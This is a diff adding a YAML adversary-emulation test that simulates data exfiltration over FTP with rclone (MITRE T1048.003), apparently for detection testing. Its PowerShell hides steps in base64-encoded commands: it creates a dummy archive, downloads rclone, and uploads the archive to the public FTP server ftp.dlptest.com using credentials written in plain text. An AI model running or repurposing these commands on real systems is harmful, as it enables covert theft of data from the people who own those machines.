@@ -1,0 +1,25 @@
+- id: c4239293-1b27-5926-9efa-1697df2d3f52
+  name: Soumaia ART Tests - Exfiltration Over Alternative Protocol - FTP - Rclone
+  description: 'Rclone may be used by an adversary to exfiltrate data to a publicly hosted FTP server.
+
+    [Reference](https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/) (requires elevation)'
+  tactic: exfiltration
+  technique:
+    attack_id: T1048.003
+    name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwARABvAHcAbgBsAG8AYQBkAHMAXABlAHgAZgBpAGwALgB6AGkAcAApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand ZgBzAHUAdABpAGwAIABmAGkAbABlACAAYwByAGUAYQB0AGUAbgBlAHcAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEQAbwB3AG4AbABvAGEAZABzAFwAZQB4AGYAaQBsAC4AegBpAHAAIAAyADAANAA4ADUANwA2ADAACgA=
+          }
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwARABvAHcAbgBsAG8AYQBkAHMAXAByAGMAbABvAG4AZQAtAGMAdQByAHIAZQBuAHQALQB3AGkAbgBkAG8AdwBzAC0AYQBtAGQANgA0AC4AegBpAHAAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGQAbwB3AG4AbABvAGEAZABzAC4AcgBjAGwAbwBuAGUALgBvAHIAZwAvAHIAYwBsAG8AbgBlAC0AYwB1AHIAcgBlAG4AdAAtAHcAaQBuAGQAbwB3AHMALQBhAG0AZAA2ADQALgB6AGkAcAAiACAALQBPAHUAdABGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEQAbwB3AG4AbABvAGEAZABzAFwAcgBjAGwAbwBuAGUALQBjAHUAcgByAGUAbgB0AC0AdwBpAG4AZABvAHcAcwAtAGEAbQBkADYANAAuAHoAaQBwACIACgBFAHgAcABhAG4AZAAtAEEAcgBjAGgAaQB2AGUAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAEQAbwB3AG4AbABvAGEAZABzAFwAcgBjAGwAbwBuAGUALQBjAHUAcgByAGUAbgB0AC0AdwBpAG4AZABvAHcAcwAtAGEAbQBkADYANAAuAHoAaQBwACAALQBEAGUAcwB0AGkAbgBhAHQAaQBvAG4AUABhAHQAaAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwARABvAHcAbgBsAG8AYQBkAHMAXAAKAA==
+          }
+          $rclone_bin = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "rclone.exe" | Select-Object -ExpandProperty FullName
+          $exfil_pack = Get-ChildItem C:\Users\Public\Downloads\ -Recurse -Include "exfil.zip" | Select-Object -ExpandProperty FullName
+          &$rclone_bin config create ftpserver "ftp" "host" ftp.dlptest.com "port" 21 "user" dlpuser "pass" rNrKYTX9g7z3RgJRmxWuGHbeu
+          &$rclone_bin copy --max-age 2y $exfil_pack ftpserver --bwlimit 2M -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P --ftp-no-check-certificate
